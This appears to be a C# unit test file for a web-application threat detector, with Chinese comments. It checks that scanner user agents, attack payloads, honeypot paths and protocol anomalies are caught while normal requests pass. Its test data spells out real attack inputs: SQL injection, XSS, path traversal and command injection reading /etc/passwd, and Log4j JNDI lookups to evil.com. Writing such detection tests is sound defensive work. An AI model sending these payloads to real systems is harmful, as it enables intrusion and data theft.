using System;
using NewLife.Cube.Services;
using Xunit;

namespace NewLife.Cube.Tests.Services;

/// <summary>威胁检测器测试。覆盖扫描器指纹、攻击载荷、蜜罐路径、协议异常的检出与误报控制</summary>
public class ThreatDetectorTests
{
    #region 扫描器指纹
    [Fact(DisplayName = "扫描器指纹：sqlmap 命中拦截级")]
    public void Scanner_Sqlmap_Hit()
    {
        var rs = ThreatDetector.Detect("/Admin/User", null, "sqlmap/1.7#stable (https://sqlmap.org)");

        Assert.NotNull(rs);
        Assert.Equal("扫描器", rs!.Category);
        Assert.Equal(2, rs.Level);
    }

    [Fact(DisplayName = "扫描器指纹：正常浏览器不误伤")]
    public void Scanner_Browser_NotHit()
    {
        var rs = ThreatDetector.Detect("/Admin/User", null, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");

        Assert.Null(rs);
    }

    [Fact(DisplayName = "扫描器指纹：curl与python-requests通用客户端不误伤")]
    public void Scanner_CommonClient_NotHit()
    {
        Assert.Null(ThreatDetector.Detect("/api/Data/Get?pageIndex=1", null, "curl/8.4.0"));
        Assert.Null(ThreatDetector.Detect("/api/Data/Get?pageIndex=1", null, "python-requests/2.31.0"));
    }
    #endregion

    #region 攻击载荷
    [Theory(DisplayName = "SQL注入载荷命中拦截级")]
    [InlineData("/Admin/User?id=1'%20union%20select%201,2,3--")]
    [InlineData("/Admin/User?name=1%20or%201=1")]
    [InlineData("/Admin/User?q=(select%20sleep(5))")]
    [InlineData("/Admin/User?id=1;select%20*%20from%20information_schema.tables")]
    [InlineData("/Admin/User?name=1'%20or%20'1")]
    public void Attack_SqlInjection_Hit(String url)
    {
        var rs = ThreatDetector.Detect(url);

        Assert.NotNull(rs);
        Assert.Equal("SQL注入", rs!.Category);
        Assert.Equal(2, rs.Level);
    }

    [Theory(DisplayName = "XSS载荷命中拦截级")]
    [InlineData("/Admin/User?name=%3Cscript%3Ealert(1)%3C/script%3E")]
    [InlineData("/Admin/User?url=javascript:alert(1)")]
    [InlineData("/Admin/User?img=%3Cimg%20src=x%20onerror=alert(1)%3E")]
    public void Attack_Xss_Hit(String url)
    {
        var rs = ThreatDetector.Detect(url);

        Assert.NotNull(rs);
        Assert.Equal("XSS", rs!.Category);
        Assert.Equal(2, rs.Level);
    }

    [Theory(DisplayName = "路径遍历与敏感文件检出")]
    [InlineData("/Admin/File?path=../../etc/passwd", 2)]
    [InlineData("/Admin/File?path=../appsettings.json", 1)]
    [InlineData("/Admin/File?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd", 2)]
    [InlineData("/Admin/File?path=/etc/passwd", 2)]
    public void Attack_PathTraversal_Hit(String url, Int32 level)
    {
        var rs = ThreatDetector.Detect(url);

        Assert.NotNull(rs);
        Assert.Equal("路径遍历", rs!.Category);
        Assert.Equal(level, rs.Level);
    }

    [Fact(DisplayName = "命令注入等组合载荷命中拦截级")]
    public void Attack_CommandInjection_Hit()
    {
        var rs = ThreatDetector.Detect("/Admin/Ping?host=127.0.0.1;cat%20/etc/passwd");

        Assert.NotNull(rs);
        Assert.Equal(2, rs!.Level);
    }

    [Theory(DisplayName = "Log4j与文件包含命中拦截级")]
    [InlineData("/a?x=${jndi:ldap://evil.com/a}")]
    [InlineData("/a?x=${lower:jndi:ldap://evil.com/a}")]
    [InlineData("/a?f=php://filter/convert.base64-encode/resource=index")]
    public void Attack_Log4jAndFileInclude_Hit(String url)
    {
        var rs = ThreatDetector.Detect(url);

        Assert.NotNull(rs);
        Assert.Equal(2, rs!.Level);
    }

    [Fact(DisplayName = "请求体注入：表单与JSON命中")]
    public void Attack_Body_Hit()
    {
        var rs = ThreatDetector.Detect("/Admin/User/Edit", "name=1' union select 1--", "Mozilla/5.0 Chrome/126.0");
        Assert.NotNull(rs);
        Assert.Equal("SQL注入", rs!.Category);

        rs = ThreatDetector.Detect("/api/Comment/Add", "{\"content\":\"<script>alert(1)</script>\"}", "Mozilla/5.0 Chrome/126.0");
        Assert.NotNull(rs);
        Assert.Equal("XSS", rs!.Category);
    }

    [Fact(DisplayName = "富文本含script为已知拦截面（管理员可用放行规则豁免）")]
    public void RichText_Script_KnownHit()
    {
        var rs = ThreatDetector.Detect("/Admin/Page/Edit", "body=<script>legit()</script>", "Mozilla/5.0 Chrome/126.0");

        Assert.NotNull(rs);
    }
    #endregion

    #region 蜜罐与协议异常
    [Theory(DisplayName = "蜜罐路径探测命中拦截级")]
    [InlineData("/.env")]
    [InlineData("/.git/config")]
    [InlineData("/wp-login.php")]
    [InlineData("/phpmyadmin/index.php")]
    [InlineData("/actuator/env")]
    [InlineData("/druid/index.html")]
    [InlineData("/shell.php")]
    public void Honeypot_Hit(String url)
    {
        var rs = ThreatDetector.Detect(url, null, "Mozilla/5.0 Chrome/126.0");

        Assert.NotNull(rs);
        Assert.Equal(2, rs!.Level);
    }

    [Theory(DisplayName = "协议异常：空字节与双重编码")]
    [InlineData("/a?x=%00", "空字节", 2)]
    [InlineData("/a?x=%252e%252e", "双重编码", 1)]
    public void Anomaly_Protocol_Hit(String url, String pattern, Int32 level)
    {
        var rs = ThreatDetector.Detect(url);

        Assert.NotNull(rs);
        Assert.Equal("协议异常", rs!.Category);
        Assert.Equal(pattern, rs.Pattern);
        Assert.Equal(level, rs.Level);
    }

    [Fact(DisplayName = "协议异常：超长URL命中可疑级")]
    public void Anomaly_LongUrl_Hit()
    {
        var url = "/a?x=" + new String('a', 3000);
        var rs = ThreatDetector.Detect(url);

        Assert.NotNull(rs);
        Assert.Equal("协议异常", rs!.Category);
        Assert.Equal("超长URL", rs.Pattern);
        Assert.Equal(1, rs.Level);
    }
    #endregion

    #region 误报控制
    [Theory(DisplayName = "正常请求不误报")]
    [InlineData("/Admin/User/Edit?id=5")]
    [InlineData("/Admin/User?q=%E6%B5%8B%E8%AF%95%E5%85%B3%E9%94%AE%E5%AD%97")]
    [InlineData("/api/Order/GetPage?pageIndex=1&pageSize=20&sort=CreateTime")]
    [InlineData("/Admin/Attachment/View?src=data:image/png;base64,iVBORw0KGgoAAAANSUhEUg")]
    [InlineData("/Cube/CronJob/ExecuteNow?id=123456")]
    public void NormalUrl_NotHit(String url)
    {
        Assert.Null(ThreatDetector.Detect(url, null, "Mozilla/5.0 Chrome/126.0"));
    }

    [Fact(DisplayName = "正常表单内容不误报")]
    public void NormalBody_NotHit()
    {
        var body = "Name=%E5%BC%A0%E4%B8%89&Remark=%E8%BF%99%E6%98%AF%E4%B8%80%E6%AE%B5%E6%99%AE%E9%80%9A%E5%A4%87%E6%B3%A8%EF%BC%8C%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97123%E5%92%8C%E7%AC%A6%E5%8F%B7%23%40";

        Assert.Null(ThreatDetector.Detect("/Admin/User/Edit", body, "Mozilla/5.0 Chrome/126.0"));
    }

    [Fact(DisplayName = "空请求不误报")]
    public void EmptyRequest_NotHit()
    {
        Assert.Null(ThreatDetector.Detect(null));
        Assert.Null(ThreatDetector.Detect("", "", ""));
    }
    #endregion
}
